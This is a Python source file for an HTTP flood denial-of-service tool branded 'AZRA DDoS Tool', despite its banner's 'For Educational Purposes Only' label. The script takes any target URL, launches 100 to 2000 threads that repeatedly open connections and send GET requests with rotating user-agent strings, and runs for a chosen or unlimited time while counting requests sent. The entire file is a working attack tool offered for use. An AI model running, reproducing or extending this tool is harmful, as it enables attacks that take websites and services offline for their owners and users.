import socket
import threading
import time
import random
import sys
import os
from urllib.parse import urlparse

class AZRADDoS:
    def __init__(self):
        self.attack_num = 0
        self.running = False
        self.threads = []
        self.user_agents = []
        self.load_user_agents()
        
    def load_user_agents(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)",
            "Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0"
        ]
    
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = """
        \033[91m
          █████╗ ███████╗██████╗  █████╗ 
         ██╔══██╗╚══███╔╝██╔══██╗██╔══██╗
         ███████║  ███╔╝ ██████╔╝███████║
         ██╔══██║ ███╔╝  ██╔══██╗██╔══██║
         ██║  ██║███████╗██║  ██║██║  ██║
         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
         
         \033[93mAdvanced DDoS Tool - For Educational Purposes Only
         \033[94mCreated by AZRA Security Team
         \033[0m
        """
        print(banner)
    
    def get_target_info(self):
        self.show_banner()
        url = input("[\033[92m*\033[0m] Target URL (e.g., http://example.com): ")
        
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            parsed_url = urlparse('http://' + url)
        
        self.target = parsed_url.hostname
        self.port = parsed_url.port if parsed_url.port else 80
        self.path = parsed_url.path if parsed_url.path else '/'
        
        print(f"[\033[92m*\033[0m] Target: {self.target}")
        print(f"[\033[92m*\033[0m] Port: {self.port}")
        print(f"[\033[92m*\033[0m] Path: {self.path}")
        
        while True:
            try:
                threads = int(input("[\033[92m*\033[0m] Number of bots (100-2000): "))
                if 100 <= threads <= 2000:
                    self.thread_count = threads
                    break
                else:
                    print("[\033[91m!\033[0m] Please enter between 100-2000")
            except ValueError:
                print("[\033[91m!\033[0m] Please enter a valid number")
        
        self.duration = int(input("[\033[92m*\033[0m] Attack duration (seconds, 0 for unlimited): "))
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            return sock
        except:
            return None
    
    def generate_payload(self):
        user_agent = random.choice(self.user_agents)
        payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"\r\n"
        )
        return payload.encode('utf-8')
    
    def attack(self):
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    payload = self.generate_payload()
                    for _ in range(random.randint(10, 50)):
                        try:
                            sock.send(payload)
                        except:
                            break
                    sock.close()
                    
                    with threading.Lock():
                        self.attack_num += 1
                        if self.attack_num % 100 == 0:
                            print(f"[\033[92m*\033[0m] Sent {self.attack_num} requests to {self.target}")
                else:
                    time.sleep(0.1)
            except:
                pass
            
            time.sleep(random.uniform(0.01, 0.1))
    
    def start_attack(self):
        self.get_target_info()
        self.running = True
        start_time = time.time()
        
        print(f"[\033[92m*\033[0m] Starting attack on {self.target} with {self.thread_count} bots...")
        
        # Create attack threads
        for _ in range(self.thread_count):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        # Monitor attack
        try:
            while self.running:
                elapsed = time.time() - start_time
                if self.duration > 0 and elapsed >= self.duration:
                    self.running = False
                    break
                
                print(f"[\033[94m*\033[0m] Attack in progress: {int(elapsed)}s elapsed, {self.attack_num} requests sent", end='\r')
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[\033[93m!\033[0m] Stopping attack...")
            self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join()
        
        print(f"\n[\033[92m*\033[0m] Attack finished. Total requests sent: {self.attack_num}")

if __name__ == "__main__":
    tool = AZRADDoS()
    tool.start_attack()